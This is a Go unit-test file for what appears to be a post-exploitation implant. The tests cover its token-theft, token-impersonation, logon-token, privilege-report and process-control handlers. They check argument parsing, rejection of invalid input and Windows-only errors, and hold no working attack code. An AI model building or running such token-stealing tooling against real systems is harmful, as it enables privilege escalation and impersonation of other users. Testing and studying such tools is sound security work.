package main

import (
	"context"
	"encoding/json"
	"runtime"
	"strings"
	"testing"
)

func TestParseMakeTokenArgs(t *testing.T) {
	req, err := parseMakeTokenArgs("CORP\\alice s3cret example.com")
	if err != nil {
		t.Fatalf("whitespace form: %v", err)
	}
	if req.Username != `CORP\alice` || req.Password != "s3cret" || req.Domain != "example.com" {
		t.Fatalf("unexpected request: %+v", req)
	}

	req, err = parseMakeTokenArgs(`{"username":"bob","password":"p a s s","domain":"","logon_type":"network"}`)
	if err != nil {
		t.Fatalf("JSON form: %v", err)
	}
	if req.Username != "bob" || req.Password != "p a s s" || req.LogonType != "network" {
		t.Fatalf("unexpected JSON request: %+v", req)
	}

	for _, bad := range []string{"", "only-user", `{"username":"u"}`} {
		if _, err := parseMakeTokenArgs(bad); err == nil {
			t.Errorf("parseMakeTokenArgs(%q) unexpectedly succeeded", bad)
		}
	}
}

func TestProcessInfoHandler(t *testing.T) {
	out, err := handleProcessInfo(context.Background(), "")
	if err != nil {
		t.Fatalf("process_info: %v", err)
	}
	var resp struct {
		Processes []struct {
			PID  int    `json:"pid"`
			Name string `json:"name"`
		} `json:"processes"`
	}
	if err := json.Unmarshal([]byte(out), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(resp.Processes) == 0 {
		t.Fatal("process_info returned no processes")
	}
	foundSelf := false
	for _, p := range resp.Processes {
		if p.PID > 0 && p.Name != "" {
			foundSelf = true
			break
		}
	}
	if !foundSelf {
		t.Fatalf("process list lacks usable entries: %+v", resp.Processes[:min(3, len(resp.Processes))])
	}
}

func TestProcessSuspendResumeRejectInvalidPID(t *testing.T) {
	for _, handler := range []taskHandler{handleProcessSuspend, handleProcessResume} {
		for _, args := range []string{"", "0", "-4", "abc"} {
			if _, err := handler(context.Background(), args); err == nil {
				t.Errorf("handler(%q) unexpectedly succeeded", args)
			}
		}
	}
}

func TestTokenHandlersRejectInvalidArgs(t *testing.T) {
	if _, err := handleTokenSteal(context.Background(), "not-a-pid"); err == nil {
		t.Error("token_steal accepted an invalid PID")
	}
	if _, err := handleTokenImpersonate(context.Background(), "  "); err == nil {
		t.Error("token_impersonate accepted an empty token ID")
	}
}

func TestTokenOperationsAreWindowsOnly(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the unsupported-manager path is not used on Windows")
	}
	for name, call := range map[string]func() (string, error){
		"token_list":        func() (string, error) { return handleTokenList(context.Background(), "") },
		"token_steal":       func() (string, error) { return handleTokenSteal(context.Background(), "1") },
		"token_revert":      func() (string, error) { return handleTokenRevert(context.Background(), "") },
		"token_impersonate": func() (string, error) { return handleTokenImpersonate(context.Background(), "t1") },
	} {
		if _, err := call(); err == nil || !strings.Contains(err.Error(), "Windows") {
			t.Errorf("%s error = %v, want a Windows-only error", name, err)
		}
	}
}

func TestGetprivsReportsIdentity(t *testing.T) {
	out, err := handleGetprivs(context.Background(), "")
	if err != nil {
		t.Fatalf("getprivs: %v", err)
	}
	var report map[string]any
	if err := json.Unmarshal([]byte(out), &report); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if runtime.GOOS != "windows" {
		if _, ok := report["uid"]; !ok {
			t.Fatalf("getprivs output lacks uid: %s", out)
		}
	}
}
